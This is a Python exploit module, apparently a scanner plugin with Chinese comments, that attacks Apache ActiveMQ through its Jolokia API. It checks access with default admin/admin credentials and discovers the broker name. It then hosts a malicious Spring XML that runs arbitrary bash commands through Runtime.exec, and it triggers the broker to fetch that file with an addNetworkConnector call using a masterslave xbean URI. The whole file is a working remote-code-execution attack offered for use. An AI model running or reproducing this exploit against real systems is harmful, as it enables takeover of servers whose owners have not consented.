import requests
import json
import re
import threading
import socket
import traceback
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# 全局变量，用于存储HTTP服务器信息
_httpd = None
_server_thread = None

class MaliciousXMLHandler(BaseHTTPRequestHandler):
    """提供恶意Spring XML的HTTP处理器"""
    malicious_xml = None

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'application/xml')
        self.end_headers()
        if self.malicious_xml:
            self.wfile.write(self.malicious_xml.encode())
        else:
            self.wfile.write(b'')

    def log_message(self, format, *args):
        pass  # 抑制日志

def start_http_server(port, xml_content):
    """启动一个临时的HTTP服务器来提供恶意XML"""
    global _httpd, _server_thread
    MaliciousXMLHandler.malicious_xml = xml_content
    _httpd = HTTPServer(('0.0.0.0', port), MaliciousXMLHandler)
    _server_thread = threading.Thread(target=_httpd.serve_forever)
    _server_thread.daemon = True
    _server_thread.start()
    return port

def stop_http_server():
    global _httpd
    if _httpd:
        _httpd.shutdown()
        _httpd.server_close()
        _httpd = None

def get_local_ip():
    """获取本机IP地址（尽量选取非回环地址）"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return '127.0.0.1'

def generate_malicious_xml(command):
    """生成包含指定命令的恶意Spring XML"""
    escaped_cmd = command.replace('"', '&quot;').replace('&', '&amp;')
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">

    <bean id="runtime" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetClass" value="java.lang.Runtime"/>
        <property name="targetMethod" value="getRuntime"/>
    </bean>
    <bean id="exec" class="org.springframework.beans.factory.config.MethodInvokingFactoryBean">
        <property name="targetObject" ref="runtime"/>
        <property name="targetMethod" value="exec"/>
        <property name="arguments">
            <list>
                <value>/bin/bash</value>
                <value>-c</value>
                <value>{escaped_cmd}</value>
            </list>
        </property>
    </bean>
</beans>'''
    return xml

def check_jolokia(url, username, password, timeout=10):
    """检查Jolokia接口是否可访问"""
    endpoint = f"{url.rstrip('/')}/api/jolokia/"
    auth = None
    if username and password:
        from requests.auth import HTTPBasicAuth
        auth = HTTPBasicAuth(username, password)
    try:
        resp = requests.get(endpoint, auth=auth, verify=False, timeout=timeout)
        if resp.status_code == 200:
            data = resp.json()
            version = data.get("info", {}).get("version", "Unknown")
            return {"accessible": True, "version": version}
        elif resp.status_code == 401:
            return {"accessible": False, "reason": "Unauthorized"}
        else:
            return {"accessible": False, "status_code": resp.status_code}
    except Exception as e:
        return {"accessible": False, "error": str(e)}

def discover_broker_name(url, username, password, timeout=10):
    """自动发现brokerName"""
    endpoint = f"{url.rstrip('/')}/api/jolokia/"
    list_payload = {"type": "list", "path": "org.apache.activemq"}
    auth = None
    if username and password:
        from requests.auth import HTTPBasicAuth
        auth = HTTPBasicAuth(username, password)
    try:
        resp = requests.post(endpoint, json=list_payload, auth=auth, verify=False, timeout=timeout)
        if resp.status_code != 200:
            return None
        data = resp.json()
        activemq_domain = data.get("value", {}).get("org.apache.activemq", {})
        for mbean_name in activemq_domain.keys():
            match = re.search(r"brokerName=([^,\]]+)", mbean_name)
            if match:
                return match.group(1)
        return "localhost"
    except:
        return None

def _verify(target):
    """验证漏洞存在性：检查Jolokia接口可访问并尝试获取brokerName"""
    url = target["target"]
    task_args = target.get("task_args", {})
    username = task_args.get("username", "admin")
    password = task_args.get("password", "admin")
    try:
        check = check_jolokia(url, username, password)
        if not check.get("accessible"):
            reason = check.get("reason", check.get("error", "unknown"))
            return None
        broker = discover_broker_name(url, username, password)
        if broker:
            return {'target': url, 'result': f'Jolokia接口可访问，brokerName={broker}，存在利用可能'}
        else:
            return {'target': url, 'result': 'Jolokia接口可访问，但无法自动发现brokerName，可能需要手动指定'}
    except:
        raise RuntimeError(traceback.format_exc())

def _cmd_exc(target, cmd):
    """命令执行：启动HTTP服务器托管恶意XML，然后发送Jolokia exploit请求"""
    url = target["target"]
    task_args = target.get("task_args", {})
    username = task_args.get("username", "admin")
    password = task_args.get("password", "admin")
    callback = task_args.get("callback", None)
    try:
        # 生成恶意XML
        xml_content = generate_malicious_xml(cmd)
        # 确定HTTP服务器端口和URL
        if callback:
            # 用户指定了回调地址，假设该地址已运行着HTTP服务
            xml_url = callback.rstrip('/') + '/malicious.xml'
            # 但是我们需要将XML内容放置在那里？这里假设用户已经托管了，所以我们只发送exploit
            # 为了自动化，我们仍然启动本地服务器并覆盖callback？矛盾。
            # 更好的做法：如果用户指定了callback，则直接使用该URL（需要用户保证XML内容一致）
            # 为了简单，我们默认启动本地HTTP服务器，并忽略callback中指定的URL，而是使用本地IP+端口
            # 这里我们忽略callback，自动启动本地服务器
            pass
        # 启动本地HTTP服务器（随机端口）
        import random
        port = random.randint(20000, 60000)
        start_http_server(port, xml_content)
        local_ip = get_local_ip()
        xml_url = f"http://{local_ip}:{port}/malicious.xml"
        
        # 构造discovery URI
        discovery_uri = f"masterslave://?brokerConfig=xbean:{xml_url}"
        # 获取brokerName
        broker = discover_broker_name(url, username, password)
        if not broker:
            broker = "localhost"
        mbean = f"org.apache.activemq:type=Broker,brokerName={broker}"
        # 构建Jolokia payload
        payload = {
            "type": "exec",
            "mbean": mbean,
            "operation": "addNetworkConnector",
            "arguments": [discovery_uri]
        }
        endpoint = f"{url.rstrip('/')}/api/jolokia/"
        auth = None
        if username and password:
            from requests.auth import HTTPBasicAuth
            auth = HTTPBasicAuth(username, password)
        headers = {
            "Content-Type": "application/json",
            "Origin": url.rstrip("/"),
            "Referer": f"{url.rstrip('/')}/"
        }
        resp = requests.post(endpoint, json=payload, headers=headers, auth=auth, verify=False, timeout=10)
        # 命令是异步执行的，响应可能不包含执行结果
        # 关闭HTTP服务器
        stop_http_server()
        if resp.status_code == 200:
            try:
                result_json = resp.json()
                if "error" in result_json:
                    error_info = result_json["error"]
                    error_str = str(error_info)[:200]
                    return {'target': url, 'result': f'Exploit发送但返回错误：{error_str}'}
                else:
                    return {'target': url, 'result': f'Exploit发送成功，命令已异步执行，HTTP服务器地址：{xml_url}'}
            except:
                return {'target': url, 'result': f'Exploit发送成功（非JSON响应），命令已异步执行，HTTP服务器地址：{xml_url}'}
        elif resp.status_code == 401:
            return {'target': url, 'result': '认证失败，请检查凭据'}
        else:
            return {'target': url, 'result': f'请求失败，HTTP状态码{resp.status_code}'}
    except Exception as e:
        stop_http_server()
        raise RuntimeError(traceback.format_exc())

if __name__ == "__main__":
    print(_verify({'target': 'http://example.com:8161', 'task_args': {'username': 'admin', 'password': 'admin'}}))
